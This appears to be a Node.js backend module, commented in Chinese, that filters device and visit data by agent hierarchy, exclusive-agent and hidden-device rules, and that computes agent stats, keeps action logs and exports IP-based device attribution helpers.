// 从条目列表剔除专属代理名下数据（字段无关硬拦：serial / serial_id / ip 任一命中即剔除）
function _stripExclusive(items, field, excl) {
  const { serials, ips } = _exclFootprint(excl);
  if (!serials.size && !ips.size) return items;
  return items.filter(item => {
    if (serials.size && ((item[field] && serials.has(item[field]))
      || (item.serial && serials.has(item.serial))
      || (item.serial_id && serials.has(item.serial_id)))) return false;
    if (ips.size && item.ip && ips.has(item.ip)) return false;
    return true;
  });
}

function filterByAgent(userId, items, serialField) {
  const field = serialField || 'serial';
  if (!Array.isArray(items)) return [];
  const user = _findUser(userId);
  if (!user) return [];
  const vis = _loadVisibility();
  const excl = vis.agents;

  if (user.role === 'super_admin') {
    // 【2026-09-11 收紧】只有 viewer_ids 白名单内的超管全量可见；其余超管按"外部视角"剔除专属数据
    // 【2026-09-16】暗池：所有分支统一再剔除入池设备（对所有人不可见）
    if (!excl.size || vis.viewers.has(userId)) return _stripVault(items, field);
    return _stripVault(_stripExclusive(items, field, excl), field);
  }

  const agentIds = [userId];
  if (!excl.has(userId)) {
    // 本人是专属代理时，不向外继承任何子代理数据（保持"只有自己和白名单"）
    // 【2026-09-13 多级裂变】从"直接子级"改为"递归全部下级"（任意深度，BFS+防环）；
    //   专属代理在递归中逐级跳过——7420 已确认不再创建子代理，子树隔离问题不出现（若出现需重新评估）。
    for (const did of getDescendantAgentIds(userId)) {
      if (!excl.has(did)) agentIds.push(did);
    }
  }

  const allSerials = new Set();
  const allIPs = new Set();
  for (const aid of agentIds) {
    const ds = getAgentDeviceSet(aid);
    if (ds) ds.forEach(s => allSerials.add(s));
    const is = getAgentIPSet(aid);
    if (is) is.forEach(ip => allIPs.add(ip));
  }

  // 剔除"专属代理"名下的设备/IP（本人除外）—— 防止同 IP / 同段被其它代理通过兜底匹配看到
  // 【2026-09-11 审计修复】只删 allSerials/allIPs 不够：条目自身带 ip 时，专属设备的上报条目
  //   若 ip 落在 viewer 名下（共享出口/CGNAT/同机多链），仍会被下面的 item.ip 分支命中。
  //   这里把专属 serial 单独记下，逐条硬拦。
  const exclSerials = new Set();
  for (const exId of excl) {
    if (exId === userId) continue;
    const ds = getAgentDeviceSet(exId);
    if (ds) ds.forEach(s => { allSerials.delete(s); exclSerials.add(s); });
    const is = getAgentIPSet(exId);
    if (is) is.forEach(ip => allIPs.delete(ip));
  }

  // 【2026-09-14】排除名单设备：代理视角完全不可见（超管不受限，走前面的早返回）
  const devExcl = _loadDeviceExclude();
  return _stripVault(items.filter(item => {
    if (devExcl.size && ((item[field] && devExcl.has(String(item[field])))
      || (item.serial && devExcl.has(String(item.serial)))
      || (item.serial_id && devExcl.has(String(item.serial_id))))) return false;
    // 字段无关键：条目只要带专属设备的 serial/serial_id 就一律不可见
    //   （防某些路由 field 传成 'ip'，如 /api/user/user_visit_log/list 的条目其实自带 serial）
    if (exclSerials.size && ((item[field] && exclSerials.has(item[field]))
      || (item.serial && exclSerials.has(item.serial))
      || (item.serial_id && exclSerials.has(item.serial_id)))) return false;
    if (allSerials.size && item[field] && allSerials.has(item[field])) return true;
    // 【2026-09-18】IP 兜底可见性仅对"尚未归属任何代理"的设备生效（已归属设备只归归属方可见，防窜设备）
    const _assigned = item[field] && data.device_agents && data.device_agents[String(item[field])] !== undefined;
    if (!_assigned && allIPs.size && item.ip && allIPs.has(item.ip)) return true;
    return false;
  }), field);
}

// ---------------------------------------------------------------------------
// Stats
// ---------------------------------------------------------------------------

function getAgentStats(userId) {
  const devices = getAgentDevices(userId);
  const links = listLinks(userId);
  return {
    total_devices: devices.length,
    total_links: links.length,
    active_links: links.filter(l => l.status === 'active').length,
    total_visits: links.reduce((s, l) => s + (l.visits || 0), 0)
  };
}

function getAllStats() {
  const agents = data.users.filter(u => u.role === 'agent' && u.status !== 'deleted');
  const links = data.agent_links.filter(l => l.status !== 'deleted');
  return {
    total_agents: agents.length,
    total_devices: Object.keys(data.device_agents).length,
    total_links: links.length,
    active_links: links.filter(l => l.status === 'active').length,
    total_visits: links.reduce((s, l) => s + (l.visits || 0), 0)
  };
}

// ---------------------------------------------------------------------------
// Exports
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// Action Logs
// ---------------------------------------------------------------------------

function addLog(action, userId, username, ip, detail) {
  if (!data.action_logs) data.action_logs = [];
  const log = {
    id: (data.action_logs.length ? Math.max(...data.action_logs.map(l => l.id || 0)) : 0) + 1,
    action,
    user_id: userId || null,
    username: username || '—',
    ip: ip || '—',
    detail: detail || '',
    ts: _now(),
  };
  data.action_logs.unshift(log);
  if (data.action_logs.length > 2000) data.action_logs = data.action_logs.slice(0, 2000);
  // [IR 2026-09-17] 防抖落盘：10 秒合并一次，杜绝未认证请求触发的全量写放大
  if (!_logSaveTimer) {
    _logSaveTimer = setTimeout(() => { _logSaveTimer = null; try { _save(); } catch (e) {} }, 10000);
    if (_logSaveTimer.unref) _logSaveTimer.unref();
  }
  return log;
}

function listLogs(limit) {
  if (!data.action_logs) data.action_logs = [];
  return data.action_logs.slice(0, limit || 500);
}

module.exports = {
  init,
  beginBulk,
  endBulk,
  hashPassword,
  verifyPassword,
  login,
  logout,
  getSession,
  changePassword,
  createAgent,
  listAgents,
  getAgent,
  updateAgent,
  deleteAgent,
  resetAgentPassword,
  createLink,
  listLinks,
  deleteLink,
  getLinkByCode,
  recordLinkVisit,
  assignDevice,
  unassignDevice,
  getDeviceAgent,
  getAgentDevices,
  getAgentDeviceSet,
  assignIP,
  getAgentIPs,
  getAgentIPSet,
  autoAssignFromLink,
  filterByAgent,
  // 【2026-09-13 多级裂变】递归下级工具（可见性递归/层级展示/设备数合计）
  getDescendantAgentIds,
  getAgentDepth,
  getAgentDeviceCountTotal,
  getExclusiveAgents,
  getExclusiveViewers,
  getVaultSerials,
  // 【2026-09-14】设备排除名单（device_exclude.json）：autoAssign 跳过 + 代理视角剔除
  isDeviceExcluded,
  getExcludedSerials,
  getAgentStats,
  getAllStats,
  addLog,
  listLogs,
  // 【2026-09-10 自动归属】对外暴露归因所需的原始数据
  //  ip_agents 全量：设备精确 IP 匹配用
  //  link_visits 全量：含访问 IP/UA(带iOS版本)/时间，用于 /16段+版本+时间窗 抗漂移匹配
  getIPAgentsAll() { return Object.assign({}, ipAgents); },          // 【2026-09-13】独立单例（ip_agents.json）
  listLinkVisits(limit) { const a = linkVisits; return limit ? a.slice(-limit) : a.slice(); },   // 独立单例（link_visits.jsonl）
  getDeviceAgentMap() { return Object.assign({}, data.device_agents || {}); },
  _pruneSessions
};
